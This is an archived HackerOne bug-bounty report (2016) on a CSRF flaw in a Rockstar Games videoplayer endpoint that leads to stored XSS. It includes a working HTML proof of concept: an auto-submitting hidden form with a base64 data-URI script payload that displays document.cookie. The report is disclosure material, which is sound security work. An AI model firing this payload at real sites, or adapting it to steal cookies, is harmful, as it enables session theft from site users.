# CSRF in 'set.php' via age causes stored XSS on 'get.php' - http://www.rockstargames.com/php/videoplayer_cache/get.php'

## Metadata
- **Source:** HackerOne
- **Report:** 152013 | https://hackerone.com/reports/152013
- **Submitted:** 2016-07-18
- **Reporter:** nahamsec
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
Hello,

#Background:
Sending a POST request to set.php with age='PAYLOAD' will cause a stored XSS on the GET.php file (most likely caused by the cookie, since that's what the `age` is based on). For this vulnerability and in order to demonstrate BOTH CSRF and XSS I have written a simple script (tested on firefox)  that automatically sends the request to set.php and redirects you to the vulnerable 

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hello,

#Background:
Sending a POST request to set.php with age='PAYLOAD' will cause a stored XSS on the GET.php file (most likely caused by the cookie, since that's what the `age` is based on). For this vulnerability and in order to demonstrate BOTH CSRF and XSS I have written a simple script (tested on firefox)  that automatically sends the request to set.php and redirects you to the vulnerable file:

#POC:

````
<iframe style="display:none" name="csrf-frame" id="csrf-frame"></iframe><form method="POST" action="http://www.rockstargames.com/php/videoplayer_cache/set.php" target="csrf-frame" id="csrf-form" encType="application/x-www-form-urlencoded"><input type="text" name="age" value='<a href=data:text/html;base64,PHNjcmlwdD5hbGVydChkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0Pg==>CLICK ME</a>' /></form><script>document.getElementById("csrf-form").submit();</script><script>var xssframe = document.getElementById('csrf-frame');xssframe.addEventListener("load", function() { window.location='http://www.rockstargames.com/php/videoplayer_cache/get.php'; }); </script>
````

Thanks,
Ben

</details>

---
*Analysed by Claude on 2026-05-24*
